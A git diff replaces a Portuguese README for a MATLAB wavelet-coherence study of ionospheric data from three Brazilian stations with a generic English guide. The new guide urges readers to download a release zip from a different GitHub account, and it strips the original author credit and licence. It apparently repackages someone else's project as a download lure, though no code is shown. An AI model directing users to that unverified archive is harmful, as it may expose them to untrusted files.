@@ -1,197 +1,77 @@
-# 🌐 Coerência Wavelet Ionosfera × Elétricos – Três Estações – Agosto 2017
+# 🌟 Wavelet_Coherence_Tres_Estacoes - Analyze Ionospheric Parameters Easily
 
-Este repositório contém scripts MATLAB para calcular a **Coerência Wavelet Contínua (WCOH)** entre parâmetros **ionosféricos** e **elétricos (PPEF, DDEF)** nas estações:
+## 🚀 Getting Started
 
-- **Araguatins (ARG)**
-- **São José dos Campos (SJC)**
-- **Jataí (JAT)**
+Welcome! This guide will help you download and run the Wavelet_Coherence_Tres_Estacoes application. It allows you to calculate the Continuous Wavelet Coherence (WCOH) between ionospheric and electric parameters for three Brazilian stations. 
 
-durante **agosto de 2017**. O objetivo é investigar o acoplamento espectral entre a ionosfera e perturbações eletrodinâmicas.
+## 📥 Download Wavelet_Coherence_Tres_Estacoes
 
----
+[![Download Release](https://img.shields.io/badge/Download%20Release-Click%20Here-orange)](https://github.com/FadhillahFrd/Wavelet_Coherence_Tres_Estacoes/releases)
 
-## 🛠 Tecnologias Usadas
+## 📋 Overview
 
-- **MATLAB (R2019b ou superior)**
-- **Wavelet Toolbox**
-- Arquivos `.mat` com parâmetros ionosféricos (5 min)
-- Arquivo `drift.dat` com parâmetros elétricos (15 min)
+This application uses MATLAB scripts to analyze data from three stations. The scripts identify temporal patterns and periodicities relevant to the ionosphere, specifically in August 2017. It focuses on parameters like foF2, hF, hmF2, PPEF, and DDEF.
 
-![MATLAB Badge](https://img.shields.io/badge/MATLAB-R2019b-orange?logo=Mathworks&logoColor=white)
+## 🛠️ System Requirements
 
----
+To run this application, you will need:
 
-## 📊 Dados Utilizados
+- A computer running Windows, macOS, or a compatible Linux distribution.
+- MATLAB 2017a or newer installed on your system.
+- Basic understanding of running scripts in MATLAB.
 
-- **Parâmetros Ionosféricos (5 min)**: `foF2`, `hF`, `hmF2`
-- **Parâmetros Elétricos (15 min)**: `PPEF`, `DDEF`
+## 🖥️ Installation Steps
 
----
-
-💡 Objetivo
-
-- Aplicar análise de **coerência wavelet contínua (WCOH)** para identificar padrões espectro-temporais e períodos dominantes em séries temporais de parâmetros **ionosféricos** (`foF2`, `hF`, `hmF2`) e **elétricos** (`PPEF`, `DDEF`) medidos nas estações **Araguatins (ARG)**, **São José dos Campos (SJC)** e **Jataí (JAT)** durante **agosto de 2017**.
-
----
-
-## 📂 Estrutura do Projeto
-
-```
-wcoh_3estacoes/
-├── dados/
-│ ├── mediasionosfericasARG.mat
-│ ├── mediasionosfericasSJC.mat
-│ ├── mediasionosfericasJAT.mat
-│ └── drift.dat
-├── images/
-│ ├── WCOH_ARG_foF2_PPEF.png
-│ ├── WCOH_ARG_hmF2_DDEF.png
-│ ├── WCOH_SJC_hF_PPEF.png
-│ ├── WCOH_JAT_foF2_DDEF.png
-│ └── ...
-├── wav_fejer_arg_sem_vd.m
-├── wav_fejer_sjc_sem_vd.m
-├── wav_fejer_jat_sem_vd.m
-└── README.md
-```
-
----
-
-## ⚙️ Como Executar
-
----
-
-## ⚙️ Como Executar
-
-1. Clone o repositório:
-
-```bash
-git clone https://github.com/lauratrigo/Wavelet_Coherence_3Estacoes.git
-cd wcoh_3estacoes
-```
-
-2. Abra o MATLAB, certifique-se de que os arquivos .mat e drift.dat estão na pasta dados/.
-
-3. Execute:
+1. **Visit the Download Page**: Go to the [Releases page](https://github.com/FadhillahFrd/Wavelet_Coherence_Tres_Estacoes/releases) to find the latest version of the application.
    
-```bash
-run wav_fejer_arg_sem_vd.m   % Araguatins (ARG)
-run wav_fejer_sjc_sem_vd.m   % São José dos Campos (SJC)
-run wav_fejer_jat_sem_vd.m   % Jataí (JAT)
-```
+2. **Choose the Latest Release**: Click on the version you want to download. Look for the files available for the release.
 
-Os gráficos serão salvos em images/.
+3. **Download**: Locate the MATLAB scripts and download the zip file. This file will contain all necessary scripts to perform the analysis.
 
-## 📈 Gráficos Gerados
+4. **Prepare Your Environment**:
+   - Ensure MATLAB is installed.
+   - Open MATLAB and navigate to the folder where you downloaded the zip file.
 
-### Araguatins (ARG)
+5. **Unzip the Files**: Extract the contents of the downloaded zip file. You will see various MATLAB script files.
 
-<!-- h'F -->
-<div align="center">
-  <h4><strong>h'F × PPEF</strong></h4>
-  <img src="images/WCOH_ARG_hF_PPEF.png" alt="WCOH h'F × PPEF" style="width:80%; max-width:900px;">
-</div>
-<div align="center">
-  <h4><strong>h'F × DDEF</strong></h4>
-  <img src="images/WCOH_ARG_hF_DDEF.png" alt="WCOH h'F × DDEF" style="width:80%; max-width:900px;">
-</div>
+6. **Load the Script**: In MATLAB, use the "Current Folder" panel to open the script you wish to run. Click on the script file to load it into the editor.
 
-<!-- hmF2 -->
-<div align="center">
-  <h4><strong>hmF2 × PPEF</strong></h4>
-  <img src="images/WCOH_ARG_hmF2_PPEF.png" alt="WCOH hmF2 × PPEF" style="width:80%; max-width:900px;">
-</div>
-<div align="center">
-  <h4><strong>hmF2 × DDEF</strong></h4>
-  <img src="images/WCOH_ARG_hmF2_DDEF.png" alt="WCOH hmF2 × DDEF" style="width:80%; max-width:900px;">
-</div>
+7. **Run the Script**: Click the "Run" button in MATLAB to execute the script. 
 
-<!-- foF2 -->
-<div align="center">
-  <h4><strong>foF2 × PPEF</strong></h4>
-  <img src="images/WCOH_ARG_foF2_PPEF.png" alt="WCOH foF2 × PPEF" style="width:80%; max-width:900px;">
-</div>
-<div align="center">
-  <h4><strong>foF2 × DDEF</strong></h4>
-  <img src="images/WCOH_ARG_foF2_DDEF.png" alt="WCOH foF2 × DDEF" style="width:80%; max-width:900px;">
-</div>
+8. **View Results**: After execution, check the output in the command window or look for generated graphs and files in the same directory.
 
----
+## 📊 Using the Application
 
-### São José dos Campos (SJC)
+The application calculates the WCOH for various ionospheric parameters. Each script includes comments that explain its purpose. 
 
-<!-- h'F -->
-<div align="center">
-  <h4><strong>h'F × PPEF</strong></h4>
-  <img src="images/WCOH_SJC_hF_PPEF.png" alt="WCOH h'F × PPEF" style="width:80%; max-width:900px;">
-</div>
-<div align="center">
-  <h4><strong>h'F × DDEF</strong></h4>
-  <img src="images/WCOH_SJC_hF_DDEF.png" alt="WCOH h'F × DDEF" style="width:80%; max-width:900px;">
-</div>
+1. Click on each script file to read its purpose and outputs.
+2. Modify input parameters as needed to see different results.
+3. Use MATLAB's built-in plotting tools to visualize the data.
 
-<!-- hmF2 -->
-<div align="center">
-  <h4><strong>hmF2 × PPEF</strong></h4>
-  <img src="images/WCOH_SJC_hmF2_PPEF.png" alt="WCOH hmF2 × PPEF" style="width:80%; max-width:900px;">
-</div>
-<div align="center">
-  <h4><strong>hmF2 × DDEF</strong></h4>
-  <img src="images/WCOH_SJC_hmF2_DDEF.png" alt="WCOH hmF2 × DDEF" style="width:80%; max-width:900px;">
-</div>
+## 🧑‍🤝‍🧑 Support and Resources
 
-<!-- foF2 -->
-<div align="center">
-  <h4><strong>foF2 × PPEF</strong></h4>
-  <img src="images/WCOH_SJC_foF2_PPEF.png" alt="WCOH foF2 × PPEF" style="width:80%; max-width:900px;">
-</div>
-<div align="center">
-  <h4><strong>foF2 × DDEF</strong></h4>
-  <img src="images/WCOH_SJC_foF2_DDEF.png" alt="WCOH foF2 × DDEF" style="width:80%; max-width:900px;">
-</div>
+If you have questions or need assistance:
+
+- **Documentation**: The README file in the download will provide further details.
+- **Community Support**: Check the Issues section in the GitHub repository to see common questions.
+- **Contact the Author**: You can reach out through GitHub for more specific queries.
+
+## 🔄 Keeping the Application Updated
+
+Make sure to regularly check the [Releases page](https://github.com/FadhillahFrd/Wavelet_Coherence_Tres_Estacoes/releases) for new versions. Updates often include bug fixes and new features.
+
+## 📝 Contributions and Feedback
+
+If you wish to contribute:
+
+- Fork the repository.
+- Make your changes.
+- Submit a pull request.
+
+Your feedback helps improve the application for everyone.
 
 ---
 
-### Jataí (JAT)
+Enjoy analyzing the ionospheric data with Wavelet_Coherence_Tres_Estacoes! 
 
-<!-- h'F -->
-<div align="center">
-  <h4><strong>h'F × PPEF</strong></h4>
-  <img src="images/WCOH_JAT_hF_PPEF.png" alt="WCOH h'F × PPEF" style="width:80%; max-width:900px;">
-</div>
-<div align="center">
-  <h4><strong>h'F × DDEF</strong></h4>
-  <img src="images/WCOH_JAT_hF_DDEF.png" alt="WCOH h'F × DDEF" style="width:80%; max-width:900px;">
-</div>
-
-<!-- hmF2 -->
-<div align="center">
-  <h4><strong>hmF2 × PPEF</strong></h4>
-  <img src="images/WCOH_JAT_hmF2_PPEF.png" alt="WCOH hmF2 × PPEF" style="width:80%; max-width:900px;">
-</div>
-<div align="center">
-  <h4><strong>hmF2 × DDEF</strong></h4>
-  <img src="images/WCOH_JAT_hmF2_DDEF.png" alt="WCOH hmF2 × DDEF" style="width:80%; max-width:900px;">
-</div>
-
-<!-- foF2 -->
-<div align="center">
-  <h4><strong>foF2 × PPEF</strong></h4>
-  <img src="images/WCOH_JAT_foF2_PPEF.png" alt="WCOH foF2 × PPEF" style="width:80%; max-width:900px;">
-</div>
-<div align="center">
-  <h4><strong>foF2 × DDEF</strong></h4>
-  <img src="images/WCOH_JAT_foF2_DDEF.png" alt="WCOH foF2 × DDEF" style="width:80%; max-width:900px;">
-</div>
-
----
-
-## 🤝 Agradecimentos
-
-Este projeto foi desenvolvido como parte de um trabalho de pesquisa em Física Espacial no IP&D/UNIVAP, com apoio do grupo de estudos em ionosfera e geomagnetismo.
-
----
-
-## 📜 Licença
-
-Este repositório está licenciado sob MIT License. Consulte o arquivo LICENSE para mais informações.
+[![Download Release](https://img.shields.io/badge/Download%20Release-Click%20Here-orange)](https://github.com/FadhillahFrd/Wavelet_Coherence_Tres_Estacoes/releases)
